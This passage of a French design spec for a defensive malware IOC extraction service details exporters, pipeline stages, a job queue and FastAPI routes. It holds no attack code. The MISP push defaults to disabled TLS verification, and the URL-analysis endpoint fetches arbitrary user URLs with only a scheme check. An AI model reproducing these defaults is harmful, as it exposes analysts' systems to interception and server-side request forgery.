        if malicious >= MALICIOUS_THRESHOLD: verdict = "MALVEILLANT"
        elif malicious >= 1 or suspicious >= 3: verdict = "SUSPECT"
        else: verdict = "BÉNIN"
        return (score, verdict)
        """

    def _cache_key(self, ioc_type: IOCType, value: str) -> str:
        """hashlib.sha256(f"{ioc_type}:{value}".encode()).hexdigest()[:16]"""

    def _is_cache_valid(self, key: str, ttl_hours: int) -> bool:
        """time.time() - self._cache_timestamps.get(key, 0) < ttl_hours * 3600"""

════════════════════════════════════════════════════════════════════════════════
SECTION 11 — EXPORTEURS (exporters/)
════════════════════════════════════════════════════════════════════════════════

──────────────────────────────────────────────────────────────────────────────
exporters/base.py
──────────────────────────────────────────────────────────────────────────────

class ExportFormat(str, Enum):
    STIX    = "stix"
    OPENIOC = "openioc"
    MISP    = "misp"
    CYTOMIC = "cytomic"

class ExportResult(BaseModel):
    format: ExportFormat
    content: str               # Contenu sérialisé
    content_type: str          # MIME type
    filename: str              # Nom de fichier suggéré
    ioc_count: int

class BaseExporter(ABC):
    @abstractmethod
    def export(self, bundle: IOCBundle) -> ExportResult: ...

    @property
    @abstractmethod
    def format(self) -> ExportFormat: ...

──────────────────────────────────────────────────────────────────────────────
exporters/stix_exporter.py — Port complet de stix_translator.py
──────────────────────────────────────────────────────────────────────────────

Porter EXACTEMENT le mapping IOCType → pattern STIX depuis stix_translator.py :

PATTERN_MAP: ClassVar[dict[IOCType, str]] = {
    IOCType.IPV4:         "[ipv4-addr:value = '{value}']",
    IOCType.IPV6:         "[ipv6-addr:value = '{value}']",
    IOCType.DOMAIN:       "[domain-name:value = '{value}']",
    IOCType.URL:          "[url:value = '{value}']",
    IOCType.EMAIL:        "[email-addr:value = '{value}']",
    IOCType.HASH_MD5:     "[file:hashes.MD5 = '{value}']",
    IOCType.HASH_SHA1:    "[file:hashes.'SHA-1' = '{value}']",
    IOCType.HASH_SHA256:  "[file:hashes.'SHA-256' = '{value}']",
    IOCType.HASH_SSDEEP:  "[file:hashes.SSDEEP = '{value}']",
    IOCType.HASH_IMPHASH: "[file:hashes.IMPHASH = '{value}']",
    IOCType.FILEPATH:     "[file:name = '{value}']",
    IOCType.FILENAME:     "[file:name = '{value}']",
    IOCType.REGISTRY_KEY: "[windows-registry-key:key = '{value}']",
    IOCType.MUTEX:        "[mutex:name = '{value}']",
}

LABELS_MAP: ClassVar[dict[IOCType, list[str]]] = {
    IOCType.IPV4:        ["malicious-activity", "network-indicator"],
    IOCType.IPV6:        ["malicious-activity", "network-indicator"],
    IOCType.DOMAIN:      ["malicious-activity", "network-indicator"],
    IOCType.URL:         ["malicious-activity", "network-indicator"],
    IOCType.EMAIL:       ["malicious-activity", "network-indicator"],
    IOCType.HASH_MD5:    ["malicious-activity", "file-indicator"],
    IOCType.HASH_SHA1:   ["malicious-activity", "file-indicator"],
    IOCType.HASH_SHA256: ["malicious-activity", "file-indicator"],
    IOCType.HASH_SSDEEP: ["malicious-activity", "file-indicator"],
    IOCType.HASH_IMPHASH:["malicious-activity", "file-indicator"],
    IOCType.FILEPATH:    ["malicious-activity", "host-indicator"],
    IOCType.FILENAME:    ["malicious-activity", "host-indicator"],
    IOCType.REGISTRY_KEY:["malicious-activity", "host-indicator"],
    IOCType.MUTEX:       ["malicious-activity", "host-indicator"],
    IOCType.COMMAND:     ["malicious-activity", "host-indicator"],
}

def export(self, bundle: IOCBundle) -> ExportResult:
    """
    1. Identity(name="ADMAP M1 IOC Extractor", identity_class="tool")
    2. Malware(name="Unknown Malware - {bundle.metadata.filename}",
               is_family=False, malware_types=["unknown"])
    3. Pour chaque IOC dans bundle.iocs (skip COMMAND — pas de STIX pattern) :
       pattern = PATTERN_MAP[ioc.type].format(value=ioc.value.replace("'", "\\'"))
       Indicator(name=..., pattern=pattern, valid_from=ioc.first_seen,
                 labels=LABELS_MAP[ioc.type])
    4. Relationship("indicates", indicator.id → malware.id) pour chaque indicator
    5. Bundle(objects=[identity, malware] + indicators + relationships)
    6. bundle.serialize(pretty=True)
    content_type = "application/stix+json"
    filename = f"bundle_{bundle.bundle_id}.stix.json"
    """

──────────────────────────────────────────────────────────────────────────────
exporters/openioc_exporter.py — Port complet de openioc_translator.py
──────────────────────────────────────────────────────────────────────────────

Porter EXACTEMENT le mapping IOCType → (doc_type, search_path, condition) :

IOC_MAPPING: ClassVar[dict[IOCType, tuple[str, str, str]]] = {
    IOCType.HASH_MD5:     ("FileItem", "FileItem/Md5sum",                     "is"),
    IOCType.HASH_SHA1:    ("FileItem", "FileItem/Sha1sum",                    "is"),
    IOCType.HASH_SHA256:  ("FileItem", "FileItem/Sha256sum",                  "is"),
    IOCType.HASH_SSDEEP:  ("FileItem", "FileItem/SsdeepHash",                 "is"),
    IOCType.HASH_IMPHASH: ("FileItem", "FileItem/PEInfo/ImportHash",           "is"),
    IOCType.IPV4:         ("PortItem", "PortItem/remoteIP",                   "is"),
    IOCType.IPV6:         ("PortItem", "PortItem/remoteIP",                   "is"),
    IOCType.DOMAIN:       ("DnsEntryItem","DnsEntryItem/RecordName",          "contains"),
    IOCType.URL:          ("UrlHistoryItem","UrlHistoryItem/URL",              "contains"),
    IOCType.EMAIL:        ("Email",    "Email/From",                           "contains"),
    IOCType.FILEPATH:     ("FileItem", "FileItem/FullPath",                   "contains"),
    IOCType.FILENAME:     ("FileItem", "FileItem/FileName",                   "is"),
    IOCType.REGISTRY_KEY: ("RegistryItem","RegistryItem/Path",               "contains"),
    IOCType.MUTEX:        ("SystemInfoItem","SystemInfoItem/Mutex",           "is"),
    IOCType.COMMAND:      ("ProcessItem","ProcessItem/HandleList/Handle/Name","contains"),
}

Générer XML OpenIOC 1.1 complet avec :
- Namespace : http://schemas.mandiant.com/2010/ioc
- Métadonnées : short_description, description, authored_by, authored_date
- Indicator operator="OR" contenant les IndicatorItems
- Formater avec minidom.toprettyxml(indent="  ")
content_type = "application/xml"

──────────────────────────────────────────────────────────────────────────────
exporters/misp_exporter.py — Port complet de misp_exporter.py
──────────────────────────────────────────────────────────────────────────────

Porter EXACTEMENT le mapping IOCType → (categorie_MISP, type_MISP, commentaire) :

ATTR_MAPPING: ClassVar[dict[IOCType, tuple[str, str, str]]] = {
    IOCType.HASH_MD5:     ("Payload delivery",     "md5",        "Hash MD5"),
    IOCType.HASH_SHA1:    ("Payload delivery",     "sha1",       "Hash SHA-1"),
    IOCType.HASH_SHA256:  ("Payload delivery",     "sha256",     "Hash SHA-256"),
    IOCType.HASH_SSDEEP:  ("Payload delivery",     "ssdeep",     "Hash SSDEEP"),
    IOCType.HASH_IMPHASH: ("Payload delivery",     "imphash",    "Import Hash"),
    IOCType.IPV4:         ("Network activity",     "ip-dst",     "IP destination suspecte"),
    IOCType.IPV6:         ("Network activity",     "ip-dst",     "IPv6 destination suspecte"),
    IOCType.DOMAIN:       ("Network activity",     "domain",     "Domaine suspect"),
    IOCType.URL:          ("Network activity",     "url",        "URL suspecte"),
    IOCType.EMAIL:        ("Network activity",     "email-src",  "Email suspect"),
    IOCType.FILEPATH:     ("Payload installation", "filename",   "Chemin suspect"),
    IOCType.FILENAME:     ("Payload delivery",     "filename",   "Fichier suspect"),
    IOCType.REGISTRY_KEY: ("Persistence mechanism","regkey",     "Clé de registre"),
    IOCType.MUTEX:        ("Artifacts dropped",    "mutex",      "Mutex malware"),
    IOCType.COMMAND:      ("Payload delivery",     "text",       "Commande suspecte"),
}

Mode offline : générer dict MISP Event complet (JSON sérialisable)
Mode connecté (optionnel, si PyMISP disponible) : push vers instance MISP

Import optionnel :
try:
    from pymisp import MISPEvent, PyMISP
    PYMISP_AVAILABLE = True
except ImportError:
    PYMISP_AVAILABLE = False

def export(self, bundle: IOCBundle) -> ExportResult:
    """Mode offline → JSON avec structure Event MISP complète."""

def push_to_misp(
    self,
    bundle: IOCBundle,
    misp_url: str,
    misp_key: str,
    verify_ssl: bool = False,
) -> dict:
    """
    Si PYMISP_AVAILABLE = False : lève ExtractionError avec message clair.
    Sinon : PyMISP(misp_url, misp_key, verify_ssl).add_event(event)
    En cas de connexion impossible : lève ADMAPM1Error("MISP_PUSH_FAILED")
    """

──────────────────────────────────────────────────────────────────────────────
exporters/cytomic_exporter.py — Port complet de cytomic_exporter.py
──────────────────────────────────────────────────────────────────────────────

Porter EXACTEMENT le mapping IOCType → (severity, action, description) :

HASH_CONFIGS: ClassVar[dict[IOCType, tuple[str, str, str]]] = {
    IOCType.HASH_MD5:     ("high",     "block",   "Hash MD5 du fichier malveillant"),
    IOCType.HASH_SHA1:    ("high",     "block",   "Hash SHA-1 du fichier malveillant"),
    IOCType.HASH_SHA256:  ("high",     "block",   "Hash SHA-256 du fichier malveillant"),
    IOCType.HASH_SSDEEP:  ("medium",   "alert",   "Hash SSDEEP — variantes possibles"),
    IOCType.HASH_IMPHASH: ("medium",   "alert",   "Import Hash PE — famille malware"),
}

NETWORK_CONFIGS: ClassVar[dict[IOCType, tuple[str, str, str]]] = {
    IOCType.IPV4:    ("high",   "block",   "Adresse IP C2 ou infrastructure malveillante"),
    IOCType.IPV6:    ("high",   "block",   "Adresse IPv6 C2"),
    IOCType.DOMAIN:  ("high",   "block",   "Domaine malveillant (C2, phishing, distribution)"),
    IOCType.URL:     ("high",   "block",   "URL malveillante (téléchargement payload, C2)"),
    IOCType.EMAIL:   ("medium", "alert",   "Email lié à une campagne malveillante"),
}

SYSTEM_CONFIGS: ClassVar[dict[IOCType, tuple[str, str, str]]] = {
    IOCType.FILEPATH:     ("medium",   "alert",   "Chemin fichier suspect"),
    IOCType.FILENAME:     ("medium",   "alert",   "Nom de fichier suspect"),
    IOCType.REGISTRY_KEY: ("high",     "alert",   "Clé de registre (persistance)"),
    IOCType.MUTEX:        ("medium",   "monitor", "Mutex créé par le malware"),
    IOCType.COMMAND:      ("critical", "block",   "Commande suspecte (exécution payload)"),
}

CSV_FIELDS: ClassVar[list[str]] = [
    "type", "value", "severity", "action", "description", "source", "date"
]

def export(self, bundle: IOCBundle) -> ExportResult:
    """
    Construire les lignes CSV depuis les 3 configs.
    Utiliser csv.DictWriter sur io.StringIO.
    content_type = "text/csv"
    filename = f"cytomic_{bundle.bundle_id}.csv"
    """

════════════════════════════════════════════════════════════════════════════════
SECTION 12 — PIPELINE (pipeline/)
════════════════════════════════════════════════════════════════════════════════

──────────────────────────────────────────────────────────────────────────────
pipeline/orchestrator.py — AnalysisPipeline 7 stages
──────────────────────────────────────────────────────────────────────────────

from enum import Enum
from typing import Callable
import asyncio
import time
import hashlib

ProgressCallback = Callable[[int, str], None]

class PipelineStage(str, Enum):
    FILE_IDENTIFICATION = "file_identification"
    PREPROCESSING       = "preprocessing"
    DEOBFUSCATION       = "deobfuscation"
    EXTRACTION          = "extraction"
    FILTERING           = "filtering"
    SCORING             = "scoring"
    BUNDLE_CREATION     = "bundle_creation"

STAGE_PROGRESS: ClassVar[dict[PipelineStage, int]] = {
    PipelineStage.FILE_IDENTIFICATION: 5,
    PipelineStage.PREPROCESSING:       15,
    PipelineStage.DEOBFUSCATION:       30,
    PipelineStage.EXTRACTION:          55,
    PipelineStage.FILTERING:           70,
    PipelineStage.SCORING:             85,
    PipelineStage.BUNDLE_CREATION:     100,
}

class AnalysisPipeline:
    """
    Orchestrateur principal. Injecté par dépendances FastAPI.
    Strategy pattern : les composants sont injectés, pas instanciés en dur.
    """

    def __init__(
        self,
        parsers: list[BaseParser],
        deobfuscators: list[BaseDeobfuscator],
        extractors: list[BaseExtractor],
        whitelist_filter: WhitelistFilter,
        deduplicator: IOCDeduplicator,
        defanger: IOCDefanger,
        scorer: IOCScorer,
        exporters: dict[ExportFormat, BaseExporter],
        settings: Settings,
    ):
        self._parsers = parsers
        self._deobfuscators = deobfuscators
        self._extractors = extractors
        self._whitelist_filter = whitelist_filter
        self._deduplicator = deduplicator
        self._defanger = defanger
        self._scorer = scorer
        self._exporters = exporters
        self._settings = settings
        self._logger = get_logger("pipeline.orchestrator")

    async def run(
        self,
        file_bytes: bytes,
        file_path: Path,
        options: AnalysisOptions,
        on_progress: ProgressCallback | None = None,
    ) -> IOCBundle:
        """
        Exécuter les 7 stages dans l'ordre.
        Appeler on_progress(pct, stage_name) avant chaque stage.
        Stages critiques (1, 7) : erreur → lever ExtractionError.
        Stages 2-6 : erreur catchée → logger.error() + continuer.
        Mesurer duration_ms total avec time.perf_counter().
        """
        start_time = time.perf_counter()
        context = ExtractionContext()

        # ── STAGE 1 : FILE IDENTIFICATION (CRITIQUE) ─────────────────────────
        self._report_progress(on_progress, PipelineStage.FILE_IDENTIFICATION)
        # 1a. Calculer hashes
        md5    = hashlib.md5(file_bytes).hexdigest()
        sha1   = hashlib.sha1(file_bytes).hexdigest()
        sha256 = hashlib.sha256(file_bytes).hexdigest()
        ssdeep = _calc_ssdeep(file_bytes)  # ppdeep si disponible, None sinon
        hashes = FileHashes(md5=md5, sha1=sha1, sha256=sha256, ssdeep=ssdeep)
        # 1b. Identifier le type (python-magic ou fallback magic bytes)
        filetype = _identify_filetype(file_bytes, file_path)
        # 1c. Entropie globale
        entropy = EntropyCalculator.calculate(file_bytes)
        # 1d. Parser applicable
        parser = next((p for p in self._parsers if p.can_handle(file_bytes, file_path)), None)
        if parser is None:
            # Fallback : FileMetadata minimal
            metadata = FileMetadata(
                filename=file_path.name,
                filesize=len(file_bytes),
                filetype=filetype,
                magic_bytes=file_bytes[:16].hex(),
                hashes=hashes,
                entropy=entropy,
            )
        else:
            try:
                metadata = parser.parse_metadata(file_bytes, file_path)
                metadata = metadata.model_copy(update={"hashes": hashes, "entropy": entropy})
            except Exception as e:
                raise ExtractionError(
                    f"File identification failed: {e}",
                    "FILE_ID_FAILED",
                    {"filename": file_path.name}
                )
        # 1e. Construire contexte depuis métadonnées
        context = ContextAnalyzer.build_from_metadata(metadata)

        # ── STAGE 2 : PREPROCESSING (NON-CRITIQUE) ───────────────────────────
        self._report_progress(on_progress, PipelineStage.PREPROCESSING)
        content_sources: list[tuple[bytes, str, bool]] = [
            (file_bytes, "original", False)
        ]
        try:
            # Refanging automatique si texte défangé détecté
            if self._defanger.contains_defanged(file_bytes.decode('utf-8', errors='ignore')):
                refanged = self._defanger.refang_text(
                    file_bytes.decode('utf-8', errors='ignore')
                ).encode('utf-8')
                content_sources[0] = (refanged, "original_refanged", False)

            # Extraction archive récursive
            archive_parser = next(
                (p for p in self._parsers
                 if isinstance(p, ArchiveParser) and p.can_handle(file_bytes, file_path)),
                None
            )
            if archive_parser:
                members = archive_parser.extract_members(file_bytes, file_path)
                for member_path, member_bytes in members:
                    content_sources.append((member_bytes, member_path, False))
                    context.archive_extraction_paths.append(member_path)

            # Extraction VBA si document Office
            office_parser = next(
                (p for p in self._parsers
                 if isinstance(p, OfficeParser) and p.can_handle(file_bytes, file_path)),
                None
            )
            if office_parser:
                office_parser.parse_metadata(file_bytes, file_path)
                for module_name, vba_code in office_parser.get_vba_modules():
                    content_sources.append(
                        (vba_code.encode('utf-8'), f"vba:{module_name}", False)
                    )

        except Exception as e:
            self._logger.error("preprocessing_error", error=str(e))

        # ── STAGE 3 : DEOBFUSCATION (NON-CRITIQUE) ───────────────────────────
        self._report_progress(on_progress, PipelineStage.DEOBFUSCATION)
        if options.enable_deobfuscation:
            decoded_sources: list[tuple[bytes, str, bool]] = []
            for data_bytes, source_label, _ in content_sources:
                decoded = await self._run_deobfuscation_chain(
                    data_bytes, source_label,
                    max_depth=options.max_recursion_depth,
                    context=context,
                )
                decoded_sources.extend(decoded)
            content_sources.extend(decoded_sources)

        # ── STAGE 4 : EXTRACTION (NON-CRITIQUE) ──────────────────────────────
        self._report_progress(on_progress, PipelineStage.EXTRACTION)
        all_raw_iocs: list[RawIOC] = []
        try:
            tasks = []
            for data_bytes, source_label, in_decoded in content_sources:
                src_path = file_path if source_label == "original" else Path(source_label)
                applicable = [
                    e for e in self._extractors
                    if e.can_handle(data_bytes, src_path)
                ]
                for extractor in applicable:
                    tasks.append(
                        self._run_extractor(
                            extractor, data_bytes, src_path, metadata, in_decoded
                        )
                    )
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for result in results:
                if isinstance(result, list):
                    all_raw_iocs.extend(result)
                elif isinstance(result, Exception):
                    self._logger.warning("extractor_error", error=str(result))
        except Exception as e:
            self._logger.error("extraction_stage_error", error=str(e))

        # ── STAGE 5 : FILTERING (NON-CRITIQUE) ───────────────────────────────
        self._report_progress(on_progress, PipelineStage.FILTERING)
        filtered_count = 0
        try:
            deduplicated = self._deduplicator.deduplicate(all_raw_iocs)
            kept, rejected = self._whitelist_filter.filter(deduplicated)
            filtered_count = len(rejected)
            all_raw_iocs = kept
        except Exception as e:
            self._logger.error("filtering_error", error=str(e))

        # ── STAGE 6 : SCORING (NON-CRITIQUE) ─────────────────────────────────
        self._report_progress(on_progress, PipelineStage.SCORING)
        final_iocs: list[IOC] = []
        try:
            score_results = self._scorer.score_batch(all_raw_iocs, context)
            for raw_ioc, (score, reasons) in zip(all_raw_iocs, score_results):
                if score < options.min_confidence_threshold:
                    filtered_count += 1
                    continue
                confidence_level = self._scorer.to_confidence_level(score)
                value_defanged = self._defanger.defang(raw_ioc.value, raw_ioc.type)
                final_iocs.append(IOC(
                    type=raw_ioc.type,
                    value=raw_ioc.value,
                    value_defanged=value_defanged,
                    confidence_score=score,
                    confidence_level=confidence_level,
                    context_snippet=raw_ioc.context_snippet,
                    source_offset=raw_ioc.source_offset,
                    entropy_context=raw_ioc.entropy_context,
                    extraction_method=raw_ioc.extraction_method,
                    scoring_reasons=reasons,
                    first_seen=datetime.utcnow(),
                ))
        except Exception as e:
            self._logger.error("scoring_error", error=str(e))

        # ── VT ENRICHMENT (optionnel, dans STAGE 6 si activé) ────────────────
        if options.enable_vt_enrichment and options.vt_api_key:
            try:
                async with AsyncVTEnricher(
                    options.vt_api_key,
                    is_premium=self._settings.VT_IS_PREMIUM
                ) as enricher:
                    # Enrichissement inline avant construction du bundle
                    for i, ioc in enumerate(final_iocs):
                        vt_result = await enricher._check_ioc(ioc)
                        final_iocs[i] = ioc.model_copy(
                            update={"vt_result": vt_result}
                        )
            except (VTRateLimitError, VTAPIKeyError) as e:
                self._logger.error("vt_enrichment_failed", error=str(e))

        # ── STAGE 7 : BUNDLE CREATION (CRITIQUE) ─────────────────────────────
        self._report_progress(on_progress, PipelineStage.BUNDLE_CREATION)
        duration_ms = int((time.perf_counter() - start_time) * 1000)
        by_type: dict[str, int] = {}
        for ioc in final_iocs:
            by_type[ioc.type.value] = by_type.get(ioc.type.value, 0) + 1
        stats = AnalysisStats(
            total_iocs=len(final_iocs),
            by_type=by_type,
            filtered_out=filtered_count,
            deobfuscation_layers=len(context.deobfuscation_layers),
            vt_enriched=sum(1 for i in final_iocs if i.vt_result is not None),
            duration_ms=duration_ms,
        )
        return IOCBundle(
            metadata=metadata,
            iocs=final_iocs,
            analysis_stats=stats,
        )

    async def _run_deobfuscation_chain(
        self,
        data: bytes,
        source_label: str,
        max_depth: int,
        context: ExtractionContext,
        current_depth: int = 0,
    ) -> list[tuple[bytes, str, bool]]:
        """
        Appliquer la chaîne de désobfuscateurs dans l'ordre :
        Base64Decoder → PowerShellDecoder → XORDecoder → RotDecoder
        Pour chaque désobfuscateur qui détecte :
            decoded_data, result = deobfuscator.decode(data)
            context.deobfuscation_layers.append(result)
            Si decoded_data différent de data ET current_depth < max_depth :
                Appel récursif sur decoded_data
        Retourner liste de (decoded_bytes, label, in_decoded=True)
        Timeout : asyncio.wait_for avec DEOBFUSCATION_TIMEOUT_SECONDS
        """

    async def _run_extractor(
        self,
        extractor: BaseExtractor,
        data: bytes,
        file_path: Path,
        metadata: FileMetadata,
        in_decoded: bool,
    ) -> list[RawIOC]:
        """
        Lancer extractor.extract() dans un thread pool (run_in_executor).
        Mettre in_decoded_layer sur chaque RawIOC retourné.
        En cas d'exception : log + retourner [].
        """

    def _report_progress(
        self,
        callback: ProgressCallback | None,
        stage: PipelineStage,
    ) -> None:
        """
        Appeler callback(STAGE_PROGRESS[stage], stage.value) si callback is not None.
        Logguer logger.info("pipeline_stage", stage=stage.value, progress=pct).
        """

    @staticmethod
    def _identify_filetype(file_bytes: bytes, file_path: Path) -> str:
        """
        Tenter python-magic.from_buffer() si disponible.
        Sinon : fallback sur magic bytes manuels :
          b'MZ'           → "PE32"
          b'\x7fELF'      → "ELF"
          b'\xD0\xCF\x11\xE0' → "Office/OLE"
          b'PK\x03\x04'   → "ZIP"
          b'\x1f\x8b'     → "GZIP"
          b'7z\xbc\xaf'   → "7z"
          Tentative décodage UTF-8 → "text/plain"
          Sinon → "application/octet-stream"
        """

    @staticmethod
    def _calc_ssdeep(file_bytes: bytes) -> str | None:
        """
        try: import ppdeep; return ppdeep.hash(file_bytes)
        except ImportError: return None
        """

──────────────────────────────────────────────────────────────────────────────
pipeline/job_queue.py
──────────────────────────────────────────────────────────────────────────────

class JobQueue:
    """
    File d'attente asynchrone FIFO. Entièrement programmatique.
    Pas d'interface utilisateur, pas de menu.
    """

    def __init__(self, pipeline: AnalysisPipeline, settings: Settings):
        self._pipeline = pipeline
        self._settings = settings
        self._queue: asyncio.Queue[tuple[AnalysisJob, bytes]] = asyncio.Queue(
            maxsize=settings.MAX_QUEUE_SIZE
        )
        self._jobs: dict[UUID, AnalysisJob] = {}
        self._results: dict[UUID, IOCBundle] = {}
        self._cancel_events: dict[UUID, asyncio.Event] = {}
        self._result_timestamps: dict[UUID, float] = {}
        self._worker_task: asyncio.Task | None = None
        self._cleanup_task: asyncio.Task | None = None
        self._stop_event = asyncio.Event()
        self._logger = get_logger("pipeline.job_queue")

    async def start(self) -> None:
        """Lancer le worker et le cleanup en arrière-plan."""
        self._worker_task = asyncio.create_task(self._worker())
        self._cleanup_task = asyncio.create_task(self._cleanup_expired())

    async def stop(self) -> None:
        """Graceful shutdown : vider la queue puis arrêter."""
        self._stop_event.set()
        if self._worker_task:
            self._worker_task.cancel()
            try:
                await self._worker_task
            except asyncio.CancelledError:
                pass
        if self._cleanup_task:
            self._cleanup_task.cancel()

    async def enqueue(self, job: AnalysisJob, file_bytes: bytes) -> UUID:
        """
        Stocker job dans _jobs.
        Créer asyncio.Event pour annulation.
        Mettre dans la queue.
        Retourner job.job_id.
        """

    async def get_job(self, job_id: UUID) -> AnalysisJob | None:
        """Retourner _jobs.get(job_id)"""

    async def get_result(self, job_id: UUID) -> IOCBundle | None:
        """Retourner _results.get(job_id)"""

    async def cancel_job(self, job_id: UUID) -> bool:
        """
        Si job_id dans _cancel_events : event.set(), retourner True.
        Sinon : retourner False.
        """

    async def list_jobs(
        self,
        status_filter: list[JobStatus] | None = None,
        page: int = 1,
        size: int = 20,
    ) -> tuple[list[AnalysisJob], int]:
        """
        Filtrer _jobs.values() par status_filter si fourni.
        Paginer : start=(page-1)*size, end=start+size.
        Retourner (jobs_page, total).
        """

    async def _worker(self) -> None:
        """
        Boucle :
        while not self._stop_event.is_set():
            try:
                job, file_bytes = await asyncio.wait_for(
                    self._queue.get(), timeout=1.0
                )
                if self._cancel_events[job.job_id].is_set():
                    job.status = JobStatus.CANCELLED
                    continue
                await self._process_job(job, file_bytes)
            except asyncio.TimeoutError:
                continue
            except asyncio.CancelledError:
                break
        """

    async def _process_job(self, job: AnalysisJob, file_bytes: bytes) -> None:
        """
        job.status = RUNNING, job.started_at = datetime.utcnow()
        def on_progress(pct, stage):
            job.progress = pct
            job.current_stage = stage
        try:
            bundle = await self._pipeline.run(
                file_bytes, Path(job.filename), job.options, on_progress
            )
            _results[job.job_id] = bundle
            _result_timestamps[job.job_id] = time.time()
            job.status = COMPLETED
            job.result_bundle_id = bundle.bundle_id
        except Exception as e:
            job.status = FAILED
            job.error = str(e)
        finally:
            job.completed_at = datetime.utcnow()
            job.progress = 100
        """

    async def _cleanup_expired(self) -> None:
        """
        Toutes les heures :
        Supprimer de _results et _result_timestamps les entrées
        dont time.time() - timestamp > JOB_TTL_HOURS * 3600.
        Mettre à jour _jobs correspondants avec un champ expiré.
        """

════════════════════════════════════════════════════════════════════════════════
SECTION 13 — API FASTAPI (api/)
════════════════════════════════════════════════════════════════════════════════

──────────────────────────────────────────────────────────────────────────────
api/main.py — Factory FastAPI avec lifespan
──────────────────────────────────────────────────────────────────────────────

def create_app(settings: Settings | None = None) -> FastAPI:
    """
    Factory utilisée par uvicorn ET les tests (client httpx.AsyncClient).

    Lifespan :
    @asynccontextmanager
    async def lifespan(app: FastAPI):
        s = settings or get_settings()
        pipeline = _build_pipeline(s)
        queue = JobQueue(pipeline, s)
        await queue.start()
        app.state.job_queue = queue
        app.state.pipeline = pipeline
        app.state.settings = s
        yield
        await queue.stop()

    Middlewares (dans cet ordre) :
    1. CORSMiddleware (origins=settings.ALLOWED_ORIGINS)
    2. Middleware de logging structlog :
       - Générer request_id = str(uuid4())
       - Logguer avant traitement : method, path, request_id
       - Logguer après traitement : status_code, duration_ms
    3. Middleware ContentLength :
       - Si Content-Length > MAX_UPLOAD_SIZE_MB * 1024 * 1024 → HTTP 413

    Exception handlers globaux :
    @app.exception_handler(ADMAPM1Error)
    → HTTP 400/422/500 selon le type d'exception
    → Body : {"error": "CODE", "message": "...", "details": {}, "request_id": "..."}

    @app.exception_handler(RequestValidationError) → HTTP 422
    @app.exception_handler(Exception) → HTTP 500 + logguer traceback

    Routes :
    GET /health → {"status": "ok", "version": "3.0.0"}
    GET /ready  → {"status": "ok", "queue_size": N,
                   "oletools_available": bool, "elftools_available": bool}

    Routers :
    app.include_router(analyze_router, prefix="/api/v1", tags=["Analysis"])
    app.include_router(jobs_router,    prefix="/api/v1", tags=["Jobs"])
    app.include_router(export_router,  prefix="/api/v1", tags=["Export"])
    """

def _build_pipeline(settings: Settings) -> AnalysisPipeline:
    """
    Instancier et câbler tous les composants du pipeline dans l'ordre.
    Cette fonction est le seul endroit où les dépendances sont assemblées.
    """
    parsers = [
        PEParser(),
        ELFParser(),
        OfficeParser(),
        ArchiveParser(),
    ]
    deobfuscators = [
        Base64Decoder(),
        PowerShellDecoder(),
        XORDecoder(),
        RotDecoder(),
        PackerDetector(pe_parser=parsers[0]),
    ]
    regex_ext = RegexExtractor()
    extractors = [
        PEExtractor(pe_parser=parsers[0], regex_extractor=regex_ext),
        ELFExtractor(elf_parser=parsers[1], regex_extractor=regex_ext),
        VBAExtractor(office_parser=parsers[2], regex_extractor=regex_ext),
        StringExtractor(regex_extractor=regex_ext),
        regex_ext,  # Fallback pour texte brut
    ]
    whitelist_filter = WhitelistFilter()
    deduplicator = IOCDeduplicator()
    defanger = IOCDefanger()
    scorer = IOCScorer()
    exporters = {
        ExportFormat.STIX:    STIXExporter(),
        ExportFormat.OPENIOC: OpenIOCExporter(),
        ExportFormat.MISP:    MISPExporter(),
        ExportFormat.CYTOMIC: CytomicExporter(),
    }
    return AnalysisPipeline(
        parsers=parsers,
        deobfuscators=deobfuscators,
        extractors=extractors,
        whitelist_filter=whitelist_filter,
        deduplicator=deduplicator,
        defanger=defanger,
        scorer=scorer,
        exporters=exporters,
        settings=settings,
    )

──────────────────────────────────────────────────────────────────────────────
api/dependencies.py
──────────────────────────────────────────────────────────────────────────────

from fastapi import Depends, Request, UploadFile

def get_settings(request: Request) -> Settings:
    return request.app.state.settings

def get_job_queue(request: Request) -> JobQueue:
    return request.app.state.job_queue

def get_pipeline(request: Request) -> AnalysisPipeline:
    return request.app.state.pipeline

async def validate_upload(
    file: UploadFile,
    settings: Settings = Depends(get_settings),
) -> tuple[bytes, str]:
    """
    1. Vérifier file.filename extension dans settings.ALLOWED_EXTENSIONS
       → lève UnsupportedFileTypeError si non autorisée
    2. Lire les bytes
    3. Vérifier taille <= MAX_UPLOAD_SIZE_MB * 1024 * 1024
       → lève FileTooLargeError si dépassé
    4. Sanitiser le nom de fichier (Path(file.filename).name uniquement)
    5. Retourner (file_bytes, safe_filename)
    """

──────────────────────────────────────────────────────────────────────────────
api/routers/analyze.py
──────────────────────────────────────────────────────────────────────────────

POST /api/v1/analyze
  - Body : multipart/form-data
    file: UploadFile (via validate_upload)
    options: str = "{}" (JSON de AnalysisOptions, défaut vide)
  - Parser options : AnalysisOptions.model_validate_json(options)
  - Créer AnalysisJob avec file_hash_sha256
  - Enqueue dans JobQueue
  - Retourner AnalysisJob
  - HTTP 202 Accepted

POST /api/v1/analyze/text
  - Body : {"text": "...", "options": {...}}
  - Valider : text non vide, len < 10 MB
  - Analyse SYNCHRONE via pipeline.run() avec asyncio.wait_for(timeout=30)
  - Retourner IOCBundle complet
  - HTTP 200 OK

POST /api/v1/analyze/url
  - Body : {"url": "https://...", "options": {...}}
  - Valider URL (urllib.parse.urlparse, scheme in http/https)
  - Télécharger via httpx.AsyncClient (timeout 10s, max 5 MB)
  - Extraire texte depuis HTML (html.parser stdlib)
  - Enqueue comme job texte
  - HTTP 202 Accepted

GET /api/v1/analyze/formats
  - Retourner :
    {
      "ioc_types": [e.value for e in IOCType],
      "export_formats": [e.value for e in ExportFormat],
      "capabilities": {
        "pe_parsing": True,
        "elf_parsing": ELFTOOLS_AVAILABLE,
        "office_vba": OLETOOLS_AVAILABLE,
        "archive_7z": PY7ZR_AVAILABLE,
        "ssdeep": PPDEEP_AVAILABLE,
        "vt_enrichment": bool(settings.VT_API_KEY),
      }
    }

──────────────────────────────────────────────────────────────────────────────
api/routers/jobs.py
──────────────────────────────────────────────────────────────────────────────

GET /api/v1/jobs
  Query params : status (str optionnel), page (int=1), size (int=20)
  → jobs, total = await queue.list_jobs(status_filter, page, size)
  → {"jobs": [...], "total": total, "page": page, "size": size}
  HTTP 200

GET /api/v1/jobs/{job_id}
  → job = await queue.get_job(UUID(job_id))
  → 404 si None
  HTTP 200

DELETE /api/v1/jobs/{job_id}
  → cancelled = await queue.cancel_job(UUID(job_id))
